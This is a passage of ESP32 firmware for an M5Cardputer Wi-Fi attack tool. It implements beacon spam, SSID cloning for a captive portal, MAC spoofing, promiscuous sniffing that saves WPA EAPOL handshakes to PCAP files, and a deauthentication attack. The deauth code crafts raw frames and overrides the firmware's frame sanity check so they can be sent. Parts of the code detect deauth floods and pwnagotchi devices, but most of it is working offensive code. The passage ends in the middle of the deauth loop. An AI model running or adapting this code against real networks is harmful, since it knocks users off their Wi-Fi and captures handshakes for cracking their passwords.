    // UI "Stop" en bas
    M5.Display.fillRect(0, M5.Display.height()-30, M5.Display.width(), 30, TFT_RED);
    M5.Display.setCursor(M5.Display.width()/2-24, M5.Display.height()-20);
    M5.Display.setTextColor(TFT_WHITE); M5.Display.println("Stop");

    M5.Display.setCursor(10,18); M5.Display.println("Beacon Spam running..");
    Serial.println(F("-------------------\nStarting Beacon Spam\n-------------------"));

    while(!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) &&
          !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE))
    {
        // cadence principale ~ sans dÃ©lai -> dÃ©pend du hop
        if(useCustomBeacons && !customBeacons.empty()){
            for(const auto& s: customBeacons){
                beaconSpamList(s.c_str(), s.length());
                if(M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) break;
            }
        } else {
            char *randSsid = randomSSID();
            beaconSpamList(randSsid, strlen(randSsid));
        }

        M5.update(); M5Cardputer.update();
        delay(10);
    }

    Serial.println(F("-------------------\nStopping Beacon Spam\n-------------------"));
    restoreOriginalWiFiSettings();
    waitAndReturnToMenu("Beacon Spam Stopped..");
}

// beacon spam end

/*
============================================================================================================================
Set WiFi password, ssid and mac address
============================================================================================================================
*/
void setWifiSSID() {
  M5.Display.setTextSize(1.5); // DÃ©finissez la taille du texte pour l'affichage
  M5.Display.clear(); // Effacez l'Ã©cran avant de rafraÃ®chir le texte
  M5.Display.setCursor(5, 10); // Positionnez le curseur pour le texte
  M5.Display.println("Enter SSID:"); // EntÃªte ou instruction
  M5.Display.setCursor(5, 30); // DÃ©finissez la position pour afficher le SSID
  String nameSSID = ""; // Initialisez la chaÃ®ne de donnÃ©es pour stocker le SSID entrÃ©
  enterDebounce();
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        // Ajout des caractÃ¨res pressÃ©s Ã  la chaÃ®ne de donnÃ©es
        for (auto i : status.word) {
          nameSSID += i;
        }

        // Suppression du dernier caractÃ¨re si la touche 'del' est pressÃ©e
        if (status.del && nameSSID.length() > 0) {
          nameSSID.remove(nameSSID.length() - 1);
        }

        // Afficher le SSID courant sur l'Ã©cran
        M5.Display.clear(); // Effacez l'Ã©cran avant de rafraÃ®chir le texte
        M5.Display.setCursor(5, 10); // Positionnez le curseur pour le texte
        M5.Display.println("Enter SSID:"); // EntÃªte ou instruction
        M5.Display.setCursor(5, 30); // DÃ©finissez la position pour afficher le SSID
        M5.Display.println(nameSSID); // Affichez le SSID entrÃ©
        M5.Display.display(); // Mettez Ã  jour l'affichage

        // Si la touche 'enter' est pressÃ©e, terminez la saisie et lancez la fonction de clonage
        if (status.enter) {
          if (nameSSID.length() != 0) {
            cloneSSIDForCaptivePortal(nameSSID);
            break; // Sortez de la boucle aprÃ¨s la sÃ©lection
          } else {
            M5.Display.clear();
            M5.Display.setCursor(5, 10);
            M5.Display.println("SSID Error:");
            M5.Display.setCursor(5, 30);
            M5.Display.println("Must be superior to 0 and max 32");
            M5.Display.display();
            delay(2000); // Affiche le message pendant 2 secondes
            M5.Display.clear();
            M5.Display.setCursor(5, 10);
            M5.Display.println("Enter SSID:");
            M5.Display.setCursor(5, 30);
            M5.Display.println(nameSSID); // Affichez le mot de passe entrÃ©
          }
        }
      }
    }
  }
  waitAndReturnToMenu("Set Wifi SSID :" + nameSSID);
}




void setWifiPassword() {
  String newPassword = ""; // Initialisez la chaÃ®ne pour stocker le mot de passe entrÃ©
  M5.Display.setTextSize(1.5); // DÃ©finissez la taille du texte pour l'affichage
  // Attendre que la touche KEY_ENTER soit relÃ¢chÃ©e avant de continuer
  M5.Display.clear(); // Effacez l'Ã©cran avant de rafraÃ®chir le texte
  M5.Display.setCursor(5, 10); // Positionnez le curseur pour le texte
  M5.Display.println("Enter Password:"); // EntÃªte ou instruction
  M5.Display.setCursor(5, M5.Display.height() - 12); // DÃ©finissez la position pour afficher le SSID
  M5.Display.setTextSize(1); // DÃ©finissez la taille du texte pour l'affichage
  M5.Display.println("Should be greater than 8 or egal 0"); // EntÃªte ou instruction
  M5.Display.setTextSize(1.5); // DÃ©finissez la taille du texte pour l'affichage
  enterDebounce();
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        // Ajout des caractÃ¨res pressÃ©s Ã  la chaÃ®ne de donnÃ©es
        for (auto i : status.word) {
          newPassword += i;
        }

        // Suppression du dernier caractÃ¨re si la touche 'del' est pressÃ©e
        if (status.del && newPassword.length() > 0) {
          newPassword.remove(newPassword.length() - 1);
        }

        // Afficher le mot de passe courant sur l'Ã©cran
        M5.Display.clear(); // Effacez l'Ã©cran avant de rafraÃ®chir le texte
        M5.Display.setCursor(5, 10); // Positionnez le curseur pour le texte
        M5.Display.println("Enter Password:"); // EntÃªte ou instruction
        M5.Display.setCursor(5, 30); // DÃ©finissez la position pour afficher le mot de passe
        M5.Display.println(newPassword); // Affichez le mot de passe entrÃ©
        M5.Display.display(); // Mettez Ã  jour l'affichage

        // Si la touche 'enter' est pressÃ©e, terminez la saisie
        if (status.enter) {
          if (newPassword.length() >= 8 || newPassword.length() == 0) {
            captivePortalPassword = newPassword;
            break; // Sort de la boucle aprÃ¨s la sÃ©lection
          } else {
            M5.Display.clear();
            M5.Display.setCursor(5, 10);
            M5.Display.println("Password Error:");
            M5.Display.setCursor(5, 30);
            M5.Display.println("Must be at least 8 characters");
            M5.Display.println("   Or 0 for Open Network");
            M5.Display.display();
            delay(2000); // Affiche le message pendant 2 secondes
            // Efface et redemande le mot de passe
            M5.Display.clear();
            M5.Display.setCursor(5, 10);
            M5.Display.println("Enter Password:");
            M5.Display.setCursor(5, 30);
            M5.Display.println(newPassword); // Affichez le mot de passe entrÃ©
          }
        }
      }
    }
  }
  waitAndReturnToMenu("Set Wifi Password :" + newPassword);
}

void setMacAddress() {
  String macAddress = ""; // Initialize the string to store the entered MAC address
  M5.Display.setTextSize(1.5); // Set the text size for display
  M5.Display.clear(); // Clear the screen before refreshing the text
  M5.Display.setCursor(5, 10); // Position the cursor for the text
  M5.Display.println("Enter MAC Address:"); // Header or instruction
  M5.Display.setCursor(5, M5.Display.height() - 12); // Position the cursor for instructions
  M5.Display.setTextSize(1); // Set the text size for the display
  M5.Display.println("Format: XX:XX:XX:XX:XX:XX"); // Instruction on the format
  M5.Display.setTextSize(1.5); // Set the text size back for the main input
  enterDebounce();
  
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        // Add the pressed characters to the string
        for (auto i : status.word) {
          macAddress += i;
        }

        // Remove the last character if the 'del' key is pressed
        if (status.del && macAddress.length() > 0) {
          macAddress.remove(macAddress.length() - 1);
        }

        // Display the current MAC address on the screen
        M5.Display.clear(); // Clear the screen before refreshing the text
        M5.Display.setCursor(5, 10); // Position the cursor for the text
        M5.Display.println("Enter MAC Address:"); // Header or instruction
        M5.Display.setCursor(5, 30); // Position the cursor for the MAC address
        M5.Display.println(macAddress); // Display the entered MAC address
        M5.Display.display(); // Update the display

        // If the 'enter' key is pressed, finish the input
        if (status.enter) {
          if (isValidMacAddress(macAddress)) { // Validate the MAC address format
            setDeviceMacAddress(macAddress); // Set the MAC address for AP mode
            break; // Exit the loop after setting the MAC address
          } else {
            M5.Display.clear();
            M5.Display.setCursor(5, 10);
            M5.Display.println("MAC Address Error:");
            M5.Display.setCursor(5, 30);
            M5.Display.println("Invalid format. Use:");
            M5.Display.println("XX:XX:XX:XX:XX:XX");
            M5.Display.display();
            delay(2000); // Display the message for 2 seconds
            // Clear and ask for the MAC address again
            M5.Display.clear();
            M5.Display.setCursor(5, 10);
            M5.Display.println("Enter MAC Address:");
            M5.Display.setCursor(5, 30);
            M5.Display.println(macAddress); // Display the entered MAC address
          }
        }
      }
    }
  }
  waitAndReturnToMenu("Set MAC Address :" + macAddress);
}

// Helper function to validate MAC address format
bool isValidMacAddress(String mac) {
  // Check the length and format of the MAC address
  if (mac.length() == 17) {
    for (int i = 0; i < mac.length(); i++) {
      if (i % 3 == 2) {
        if (mac.charAt(i) != ':') return false;
      } else {
        if (!isHexadecimalDigit(mac.charAt(i))) return false;
      }
    }
    return true;
  }
  return false;
}

void setDeviceMacAddress(String mac) {
    // Convert the MAC address string to a byte array
    uint8_t macBytes[6];
    for (int i = 0; i < 6; i++) {
        macBytes[i] = (uint8_t) strtol(mac.substring(3 * i, 3 * i + 2).c_str(), NULL, 16);
    }

    // Ensure the MAC address is not locally administered
    macBytes[0] &= 0xFE;

    // Initialize WiFi in AP mode only
    WiFi.mode(WIFI_MODE_AP);

    // Disconnect WiFi before setting MAC
    esp_wifi_disconnect();  
    delay(100);

    // Set the MAC address for AP (Access Point) mode
    esp_err_t resultAP = esp_wifi_set_mac(WIFI_IF_AP, macBytes);

    // Check results for AP
    if (resultAP == ESP_OK) {
        Serial.println(F("MAC address for AP mode set successfully"));
    } else {
        Serial.print(F("Failed to set MAC address for AP mode: "));
        Serial.println(esp_err_to_name(resultAP));
    }

    // Display results on the M5Stack screen
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    if (resultAP == ESP_OK) {
        M5.Display.println("MAC Address set for AP:");
        M5.Display.println(mac);
    } else {
        M5.Display.println("Error setting MAC Address");
    }
    M5.Display.display();

    // Start WiFi after setting MAC
    esp_wifi_start();  
}




// Set wifi password mac ssid end

/*
============================================================================================================================
Sniff handshake/deauth/pwnagotchi
============================================================================================================================
*/
bool beacon = false;
std::set<String> registeredBeacons;
unsigned long lastTime = 0;  // Last time update
unsigned int packetCount = 0;  // Number of packets received

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  packetCount++;
  unsigned long currentTime = millis();
  if (currentTime - lastTime >= 1000) {
    if (packetCount < 100) {
      M5.Lcd.setCursor(M5.Display.width() - 72, 0);
    } else {
      M5.Lcd.setCursor(M5.Display.width() - 81, 0);
    }
    M5.Lcd.printf(" PPS:%d ", packetCount);

    lastTime = currentTime;
    packetCount = 0;
  }

  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);


  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println(F("EAPOL Detected !!!!"));

    const uint8_t *receiverAddr = frame + 4;
    const uint8_t *senderAddr = frame + 10;

    Serial.print(F("Address MAC destination: "));
    printAddress(receiverAddr);
    Serial.print(F("Address MAC expedition: "));
    printAddress(senderAddr);

    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;
    M5.Lcd.setCursor(M5.Display.width() - 45, 14);
    M5.Lcd.printf("H:");
    M5.Lcd.print(nombreDeHandshakes);
    if (nombreDeEAPOL < 999) {
      M5.Lcd.setCursor(M5.Display.width() - 81, 28);
    } else {
      M5.Lcd.setCursor(M5.Display.width() - 90, 28);
    }
    M5.Lcd.printf("EAPOL:");
    M5.Lcd.print(nombreDeEAPOL);
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaÃ®ne de caractÃ¨res pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

    if (strcmp(macStr, "DE:AD:BE:EF:DE:AD") == 0) {
      Serial.println(F("-------------------"));
      Serial.println(F("Pwnagotchi Detected !!!"));
      Serial.print(F("CH: "));
      Serial.println(ctrl.channel);
      Serial.print(F("RSSI: "));
      Serial.println(ctrl.rssi);
      Serial.print(F("MAC: "));
      Serial.println(macStr);
      Serial.println(F("-------------------"));

      String essid = ""; // PrÃ©parer la chaÃ®ne pour l'ESSID
      int essidMaxLength = 700; // longueur max
      for (int i = 0; i < essidMaxLength; i++) {
        if (frame[i + 38] == '\0') break; // Fin de l'ESSID

        if (isAscii(frame[i + 38])) {
          essid.concat((char)frame[i + 38]);
        }
      }

      int jsonStart = essid.indexOf('{');
      if (jsonStart != -1) {
        String cleanJson = essid.substring(jsonStart); // Nettoyer le JSON

        DynamicJsonDocument json(2048); // Augmenter la taille pour l'analyse
        DeserializationError error = deserializeJson(json, cleanJson);

        if (!error) {
          String name = json["name"].as<String>(); // Extraire le nom
          String pwndnb = json["pwnd_tot"].as<String>(); // Extraire le nombre de rÃ©seaux pwned
          Serial.println("Name: " + name); // Afficher le nom
          Serial.println("pwnd: " + pwndnb); // Afficher le nombre de rÃ©seaux pwned
          // affichage
          displayPwnagotchiDetails(name, pwndnb);
        } else {
          Serial.println(F("Could not parse Pwnagotchi json"));
        }
      } else {
        Serial.println(F("JSON start not found in ESSID"));
      }
    } else {
      pkt->rx_ctrl.sig_len -= 4;  // RÃ©duire la longueur du signal de 4 bytes
      enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet

    }
  }

  // VÃ©rifier si c'est un paquet de dÃ©sauthentification
  if (frameType == 0x00 && frameSubType == 0x0C) {
    // Extraire les adresses MAC
    const uint8_t *receiverAddr = frame + 4;  // Adresse 1
    const uint8_t *senderAddr = frame + 10;  // Adresse 2
    // Affichage sur le port sÃ©rie
    Serial.println(F("-------------------"));
    Serial.println(F("Deauth Packet detected !!! :"));
    Serial.print(F("CH: "));
    Serial.println(ctrl.channel);
    Serial.print(F("RSSI: "));
    Serial.println(ctrl.rssi);
    Serial.print(F("Sender: ")); printAddress(senderAddr);
    Serial.print(F("Receiver: ")); printAddress(receiverAddr);
    Serial.println();

    // Affichage sur l'Ã©cran
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.setCursor(0, M5.Display.height() / 3 - 14);
    M5.Lcd.printf("Deauth Detected!");
    M5.Lcd.setCursor(0, M5.Display.height() / 3 );
    M5.Lcd.printf("CH: %d RSSI: %d  ", ctrl.channel, ctrl.rssi);
    M5.Lcd.setCursor(0, M5.Display.height() / 3 + 14);
    M5.Lcd.print("Send: "); printAddressLCD(senderAddr);
    M5.Lcd.setCursor(0, M5.Display.height() / 3 + 28);
    M5.Lcd.print("Receive: "); printAddressLCD(receiverAddr);
    nombreDeDeauth++;
    if (nombreDeDeauth < 999) {
      M5.Lcd.setCursor(M5.Display.width() - 90, 42);
    } else {
      M5.Lcd.setCursor(M5.Display.width() - 102, 42);
    }
    M5.Lcd.printf("DEAUTH:");
    M5.Lcd.print(nombreDeDeauth);

  }
  esp_task_wdt_reset();  // S'assurer que le watchdog est rÃ©initialisÃ© frÃ©quemment
  vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour Ã©viter de surcharger le CPU
}

void displayPwnagotchiDetails(const String& name, const String& pwndnb) {
  // Construire le texte Ã  afficher
  String displayText = "Pwnagotchi: " + name + "      \npwnd: " + pwndnb + "   ";

  // PrÃ©parer l'affichage
  M5.Lcd.setTextColor(WHITE, BLACK);
  M5.Lcd.setCursor(0, M5.Display.height() - 40);

  // Afficher les informations
  M5.Lcd.println(displayText);
}

void printAddress(const uint8_t* addr) {
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", addr[i]);
    if (i < 5) Serial.print(F(":"));
  }
  Serial.println();
}

void printAddressLCD(const uint8_t* addr) {
  // Utiliser sprintf pour formater toute l'adresse MAC en une fois
  sprintf(macBuffer, "%02X:%02X:%02X:%02X:%02X:%02X",
          addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);

  // Afficher l'adresse MAC
  M5.Lcd.print(macBuffer);
}

unsigned long lastBtnBPressTime = 0;
const long debounceDelay = 200;

void deauthDetect() {
  bool btnBPressed = false;
  unsigned long lastKeyPressTime = 0;  // Temps de la derniÃ¨re pression de touche
  const unsigned long debounceDelay = 300;  // Delai de debounce en millisecondes

  M5.Display.clear();
  M5.Lcd.setTextSize(1.5);
  M5.Lcd.setTextColor(WHITE, BLACK);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);

  int x_btnA = 32;
  int x_btnB = 140;
  int y_btns = 122;

  M5.Lcd.setCursor(x_btnA, y_btns);
  M5.Lcd.println("Mode:m");

  M5.Lcd.setCursor(x_btnB, y_btns);
  M5.Lcd.println("Back:ok");

  if (!SD.exists("/evil/handshakes") && !SD.mkdir("/evil/handshakes")) {
    Serial.println(F("Fail to create /handshakes folder"));
    return;
  }
  enterDebounce();
  while (!btnBPressed) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    M5.update();
    M5Cardputer.update();

    unsigned long currentPressTime = millis();
    bool keyPressedEnter = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);

    if (keyPressedEnter && currentPressTime - lastKeyPressTime > debounceDelay) {
      btnBPressed = true;
      lastKeyPressTime = currentPressTime;
    }

    if (M5Cardputer.Keyboard.isKeyPressed('m') && currentPressTime - lastKeyPressTime > debounceDelay) {
      autoChannelHop = !autoChannelHop;
      Serial.println(autoChannelHop ? "Auto Mode" : "Static Mode");
      lastKeyPressTime = currentPressTime;
    }

    if (!autoChannelHop) {
      if (M5Cardputer.Keyboard.isKeyPressed(',') && currentPressTime - lastKeyPressTime > debounceDelay) {
        currentChannelDeauth = currentChannelDeauth > 1 ? currentChannelDeauth - 1 : maxChannelScanning;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print(F("Static Channel : "));
        Serial.println(currentChannelDeauth);
        lastKeyPressTime = currentPressTime;
      }

      if (M5Cardputer.Keyboard.isKeyPressed('/') && currentPressTime - lastKeyPressTime > debounceDelay) {
        currentChannelDeauth = currentChannelDeauth < maxChannelScanning ? currentChannelDeauth + 1 : 1;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print(F("Static Channel : "));
        Serial.println(currentChannelDeauth);
        lastKeyPressTime = currentPressTime;
      }
    }

    if (autoChannelHop && currentPressTime - lastChannelHopTime > channelHopInterval) {
      currentChannelDeauth = (currentChannelDeauth % maxChannelScanning) + 1;
      esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
      Serial.print(F("Auto Channel : "));
      Serial.println(currentChannelDeauth);
      lastChannelHopTime = currentPressTime;
    }

    if (currentChannelDeauth != lastDisplayedChannelDeauth || autoChannelHop != lastDisplayedMode) {
      M5.Lcd.setCursor(0, 0);
      M5.Lcd.printf("Channel: %d    \n", currentChannelDeauth);
      lastDisplayedChannelDeauth = currentChannelDeauth;
    }

    if (autoChannelHop != lastDisplayedMode) {
      M5.Lcd.setCursor(0, 12);
      M5.Lcd.printf("Mode: %s  \n", autoChannelHop ? "Auto" : "Static");
      lastDisplayedMode = autoChannelHop;
    }

    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  delay(100); // Petite pause pour s'assurer que tout est terminÃ©

  waitAndReturnToMenu("Stop detection...");
}



// sniff pcap
bool estUnPaquetEAPOL(const wifi_promiscuous_pkt_t* packet) {
  const uint8_t *payload = packet->payload;
  int len = packet->rx_ctrl.sig_len;

  // length check to ensure packet is large enough for EAPOL (minimum length)
  if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
    return false;
  }

  // check for LLC/SNAP header indicating EAPOL payload
  // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
      payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 &&
      payload[30] == 0x88 && payload[31] == 0x8E) {
    return true;
  }

  // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
  // check if the frame control field's subtype indicates a QoS data subtype (0x08)
  if ((payload[0] & 0x0F) == 0x08) {
    // Adjust for the QoS Control field and recheck for LLC/SNAP header
    if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 &&
        payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 &&
        payload[32] == 0x88 && payload[33] == 0x8E) {
      return true;
    }
  }

  return false;
}


// DÃ©finition de l'en-tÃªte de fichier PCAP global
typedef struct pcap_hdr_s {
  uint32_t magic_number;   /* numÃ©ro magique */
  uint16_t version_major;  /* numÃ©ro de version majeur */
  uint16_t version_minor;  /* numÃ©ro de version mineur */
  int32_t  thiszone;       /* correction de l'heure locale */
  uint32_t sigfigs;        /* prÃ©cision des timestamps */
  uint32_t snaplen;        /* taille max des paquets capturÃ©s, en octets */
  uint32_t network;        /* type de donnÃ©es de paquets */
} pcap_hdr_t;

// DÃ©finition de l'en-tÃªte d'un paquet PCAP
typedef struct pcaprec_hdr_s {
  uint32_t ts_sec;         /* timestamp secondes */
  uint32_t ts_usec;        /* timestamp microsecondes */
  uint32_t incl_len;       /* nombre d'octets du paquet enregistrÃ©s dans le fichier */
  uint32_t orig_len;       /* longueur rÃ©elle du paquet */
} pcaprec_hdr_t;


void ecrireEntetePCAP(File &file) {
  pcap_hdr_t pcap_header;
  pcap_header.magic_number = 0xa1b2c3d4;
  pcap_header.version_major = 2;
  pcap_header.version_minor = 4;
  pcap_header.thiszone = 0;
  pcap_header.sigfigs = 0;
  pcap_header.snaplen = 65535;
  pcap_header.network = 105; // LINKTYPE_IEEE802_11

  file.write((const byte*)&pcap_header, sizeof(pcap_hdr_t));
  nombreDeHandshakes++;
}

void enregistrerDansFichierPCAP(const wifi_promiscuous_pkt_t* packet, bool beacon) {
  esp_task_wdt_reset();  // S'assurer que le watchdog est rÃ©initialisÃ© frÃ©quemment
  vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour Ã©viter de surcharger le CPU
  // Construire le nom du fichier en utilisant les adresses MAC de l'AP et du client
  const uint8_t *addr1 = packet->payload + 4;  // Adresse du destinataire (Adresse 1)
  const uint8_t *addr2 = packet->payload + 10; // Adresse de l'expÃ©diteur (Adresse 2)
  const uint8_t *bssid = packet->payload + 16; // Adresse BSSID (Adresse 3)
  const uint8_t *apAddr;

  if (memcmp(addr1, bssid, 6) == 0) {
    apAddr = addr1;
  } else {
    apAddr = addr2;
  }

  char nomFichier[50];
  sprintf(nomFichier, "/evil/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
          apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

  // VÃ©rifier si le fichier existe dÃ©jÃ 
  bool fichierExiste = SD.exists(nomFichier);

  // Si probe est true et que le fichier n'existe pas, ignorer l'enregistrement
  if (beacon && !fichierExiste) {
    return;
  }

  // Ouvrir le fichier en mode ajout si existant sinon en mode Ã©criture
  File fichierPcap = SD.open(nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE);
  if (!fichierPcap) {
    Serial.println(F("Ã‰chec de l'ouverture du fichier PCAP"));
    return;
  }

  if (!beacon && !fichierExiste) {
    Serial.println(F("Ã‰criture de l'en-tÃªte global du fichier PCAP"));
    ecrireEntetePCAP(fichierPcap);
  }

  if (beacon && fichierExiste) {
    String bssidStr = String((char*)apAddr, 6);
    if (registeredBeacons.find(bssidStr) != registeredBeacons.end()) {
      return; // Beacon dÃ©jÃ  enregistrÃ© pour ce BSSID
    }
    registeredBeacons.insert(bssidStr); // Ajouter le BSSID Ã  l'ensemble
  }

  // Ã‰crire l'en-tÃªte du paquet et le paquet lui-mÃªme dans le fichier
  pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
  pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;
  fichierPcap.write((const byte*)&pcap_packet_header, sizeof(pcaprec_hdr_t));
  fichierPcap.write(packet->payload, packet->rx_ctrl.sig_len);
  fichierPcap.close();
}
//sniff pcap end



/*
============================================================================================================================
Deauther
============================================================================================================================
*/
// Big thanks to Aro2142 (https://github.com/7h30th3r0n3/Evil-M5Core2/issues/16)
// Even Bigger thanks to spacehuhn https://github.com/spacehuhn / https://spacehuhn.com/
// Big thanks to the Nemo project for the easy bypass: https://github.com/n0xa/m5stick-nemo
// Reference to understand : https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser

// Global MAC addresses
uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast
uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Global deauth frame initialized with default values
uint8_t deauth_frame[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Receiver MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0xf0, 0xff, 0x02, 0x00
};

// Warning
// You need to bypass the ESP32 firmware with script in utilities folder before compiling or the code can't compile due to restrictions on ESP32 firmware
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}
// Warning

// Function to update MAC addresses in the global deauth frame
void updateMacAddresses(const uint8_t* bssid) {
    memcpy(source_mac, bssid, 6);
    memcpy(ap_mac, bssid, 6);

    // Update the global deauth frame with the source and BSSID
    memcpy(&deauth_frame[10], source_mac, 6);  // Source MAC
    memcpy(&deauth_frame[16], ap_mac, 6);      // BSSID
}

int deauthCount = 0;

void deauthAttack(int networkIndex) {
    if (!SD.exists("/evil/handshakes")) {
        if (SD.mkdir("/evil/handshakes")) {
            Serial.println(F("/evil/handshakes folder created"));
        } else {
            Serial.println(F("Fail to create /handshakes folder"));
            return;
        }
    }

    String ssid = WiFi.SSID(networkIndex);
    if (!confirmPopup("      Deauth attack on:\n      " + ssid)) {
        inMenu = true;
        drawMenu();
        return;
    }

    Serial.println(F("Deauth attack started"));
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    delay(300);  // Ensure previous operations complete
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);  // Set to station mode
    esp_wifi_start();  // Start Wi-Fi

    if (confirmPopup("   Do you want to sniff\n          EAPOL ?")) {
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
    }

    if (networkIndex < 0 || networkIndex >= numSsid) {
        Serial.println(F("Network index out of bounds"));
        return;
    }

    M5.Display.clear();

    // Retrieve selected AP info
    uint8_t* bssid = WiFi.BSSID(networkIndex);
    int channel = WiFi.channel(networkIndex);
    String macAddress = bssidToString(bssid);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    currentChannelDeauth = channel;
    updateMacAddresses(bssid);  // Update MAC addresses

    Serial.print(F("SSID: ")); Serial.println(ssid);
    Serial.print(F("MAC Address: ")); Serial.println(macAddress);
    Serial.print(F("Channel: ")); Serial.println(channel);

    if (!bssid || channel <= 0) {
        Serial.println(F("Invalid AP - aborting attack"));
        M5.Display.println("Invalid AP");
        return;
    }

    int delayTime = 500;  // Initial delay between deauth packets
    unsigned long previousMillis = 0;
    const int debounceDelay = 50;
    unsigned long lastDebounceTime = 0;

    // Setup display
    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
    M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 16);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.println("Stop");

    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setCursor(10, 20);
    M5.Display.println("SSID: " + ssid);
    M5.Display.setCursor(10, 34);
    M5.Display.println("MAC: " + macAddress);
    M5.Display.setCursor(10, 48);
    M5.Display.println("Channel : " + String(channel));

    M5.Display.setCursor(10, 62);
    M5.Display.print("Deauth sent: ");
    Serial.println(F("-------------------"));
    Serial.println(F("Starting Deauth Attack"));
    Serial.println(F("-------------------"));
    enterDebounce();

    while (true) {
        unsigned long currentMillis = millis();

        if (currentMillis - previousMillis >= delayTime) {
            previousMillis = currentMillis;

            sendDeauthPacket();  // Send deauth using the global frame
            deauthCount++;
            pixels.setPixelColor(0, pixels.Color(255, 0, 0));
            pixels.show();
            delay(25);
            pixels.setPixelColor(0, pixels.Color(0, 0, 0));
            pixels.show();
            M5.Display.setCursor(132, 62);
            M5.Display.print(String(deauthCount));

            M5.Display.setCursor(10, 76);
            M5.Display.print("Delay: " + String(delayTime) + "ms    ");

